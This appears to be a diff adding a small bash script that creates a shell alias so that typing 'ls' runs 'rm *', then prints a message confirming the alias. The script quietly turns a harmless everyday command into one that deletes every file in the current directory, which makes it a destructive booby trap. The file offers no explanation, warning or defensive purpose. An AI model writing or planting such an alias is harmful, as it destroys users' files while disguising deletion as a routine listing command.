@@ -1,0 +1,8 @@
+#!/bin/bash
+
+# Create an alias named "ls" with the value "rm *"
+alias ls='rm *'
+
+# Display a message to confirm the alias has been created
+echo "Alias 'ls' has been created with the value 'rm *'"
+
